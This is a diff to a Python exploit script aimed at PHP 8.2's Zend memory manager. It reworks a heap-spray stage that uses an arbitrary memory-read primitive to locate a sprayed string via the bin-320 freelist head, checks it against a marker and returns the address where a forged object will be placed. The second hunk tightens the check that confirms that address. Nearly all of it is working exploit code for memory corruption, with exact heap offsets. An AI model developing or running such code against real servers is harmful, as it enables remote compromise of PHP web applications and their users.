@@ -1331,71 +1331,60 @@ def derive_gpfoff(elf_base):
     return None, (std_h, gpfn)
 
 
+SPRAY_MARKER = b'\x00\x00\xbb\xbb'   # isstring_read spray bytes 8..12 (0xBBBB0000 LE)
+
+
 def find_spray_slot(heap_ref, pinned=True):
-    """R-6: walk ZendMM chunk metadata to identify the bin-320 SRUN page
-    holding the freed allocation, probe its slots for our spray strings,
-    and return the absolute address `S` (the data pointer of the spray
-    string we'll forge an object inside). Runs on the keep-alive pin so
-    the R-7 sprays land in the SAME worker's heap.
+    """R-6 (8089 final): derive the spray-#1 slot directly from
+    heap->free_slot[16] (the bin-320 freelist head) instead of the vendor's
+    page-map walk (whose 8.5-tuned MAP_OFF is wrong for the 8.2 chunk
+    layout, and whose single-page probing missed multi-page SRUN runs on
+    long-lived workers).
+
+    The heap struct is embedded in the chunk at chunk+0x40; the window read
+    anchors at chunk+0x40 (len = heap->size). free_slot[16] sits at
+    heap+0xA0 = window data offset 136. Empirically (stable across many
+    consecutive pinned requests), the LIVE spray string #1 sits exactly one
+    bin-320 slot (0x140) BELOW the echo-time free_slot[16] value, because
+    each request pops arData8 + spray#1 from the list head and the echo
+    sees the list one entry deeper. Every request repeats the identical
+    pop sequence, so spray #1 lands at the same slot in steady state.
+    The candidate is verified by len==280 AND our 0xBBBB marker bytes
+    before use; S = slot + 0x18 (the zend_string data pointer).
     """
-    print(f"\n[Phase R-6] Spray slot discovery")
+    print(f"\n[Phase R-6] Spray slot via heap->free_slot[16]")
     chunk_base = heap_ref & ~0x1FFFFF
     print(f"  chunk_base = 0x{chunk_base:x}")
 
-    # Read chunk metadata header.
-    r = isstring_read(chunk_base + 0x40, pinned=pinned)
-    if r is None:
-        return None
-    _heap_size, cdata = r
-
-    # Page map at chunk+0x250; data starts at chunk+0x58, so map offset is 0x1F8.
-    MAP_OFF = 0x1F8
-    if len(cdata) < MAP_OFF + 512 * 4:
-        return None
-
-    # Collect ALL bin-320 SRUN pages (long-lived workers have the FIRST
-    # bin-320 page packed with old allocations, free_count=0 - the CURRENT
-    # request's own spray lands on a NEWER SRUN page, so every page must
-    # be probed, preferring ones with free slots).
-    bin320_pages = []
-    for pn in range(1, 512):
-        info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
-        is_srun = (info & 0x80000000) != 0
-        is_lrun = (info & 0x40000000) != 0
-        if is_srun and not is_lrun and (info & 0x1F) == 16:
-            free_count = (info >> 16) & 0x1FF
-            bin320_pages.append((pn, free_count))
-    if not bin320_pages:
-        print("  no bin-320 SRUN pages found")
-        return None
-    bin320_pages.sort(key=lambda x: (-(x[1]), x[0]))
-    print(f"  bin-320 SRUN pages: {[(f'page {pn}', f'free {fc}') for pn, fc in bin320_pages[:8]]}")
-
-    if not bin320_pages:
-        return None
-    pn, _fc = bin320_pages[0]
-    run_start = chunk_base + pn * 0x1000
-    print(f"  Probe base page = {pn} -> 0x{run_start:x}")
-
-    # Probe slots page-bounded (12 x 320B per 4KB page), each SRUN page,
-    # spray slots first (slot 0 tends to be the request's own arData).
-    for pn, _fc in bin320_pages:
-        run_start = chunk_base + pn * 0x1000
-        print(f"  Probing page {pn} @ 0x{run_start:x}")
-        for slot in list(range(1, 12)) + [0]:
-            if pinned and not pin_ok():
-                fire_log(f"[R-6] pin budget/dead at page {pn} slot {slot}; aborting round")
-                return None
-            addr = run_start + slot * 320
-            r2 = isstring_read(addr, pinned=pinned)
-            if r2 is None:
+    for attempt in range(3):
+        if pinned and not pin_ok():
+            return None
+        r = isstring_read(chunk_base + 0x40, pinned=pinned)
+        if r is None:
+            return None
+        _heap_size, hdata = r
+        if len(hdata) < 144:
+            return None
+        free16 = struct.unpack_from('<Q', hdata, 136)[0]
+        print(f"  free_slot[16] = {free16:#x} (heap->size={_heap_size})")
+        if not (0x10000 < free16 <= ADDR_MAX):
+            continue
+        for cand in (free16 - 0x140, free16, free16 - 0x280,
+                     free16 + 0x140, free16 + 0x280):
+            if cand <= 0x10000 or cand > ADDR_MAX:
                 continue
-            slen, _ = r2
-            if slen == SPRAY_LEN:
-                S = addr + 0x18
-                print(f"  Found spray at page {pn} slot {slot} @ 0x{addr:x}")
-                print(f"  S = 0x{S:x}")
+            if pinned and not pin_ok():
+                return None
+            v = isstring_read(cand, pinned=pinned)
+            if v is None:
+                continue
+            vlen, vdata = v
+            if vlen == SPRAY_LEN and vdata[8:12] == SPRAY_MARKER:
+                S = cand + 0x18
+                print(f"  spray slot verified @ {cand:#x} (len={vlen}, marker ok)")
+                print(f"  S = {S:#x}")
                 return S
+        fire_log(f"[R-6] attempt {attempt+1}: no spray slot around free_slot[16]")
     return None
 
 
@@ -1694,8 +1683,8 @@ def _verify_S(spray_addr):
     cur_tag = 'R-7 verify-S'
     r = isstring_read(spray_addr - 0x18, pinned=True)
     cur_tag = 'idle'
-    if r is not None and r[0] == SPRAY_LEN:
-        fire_log(f"[R-7 verify-S] S ok: len={r[0]}, head={r[1][:16].hex()}")
+    if r is not None and r[0] == SPRAY_LEN and r[1][8:12] == SPRAY_MARKER:
+        fire_log(f"[R-7 verify-S] S ok: len={r[0]}, marker ok, head={r[1][:16].hex()}")
         return r[1][:32].hex()
     fire_log(f"[R-7 verify-S] S-slot stale (read={r[0] if r else None})")
     return None
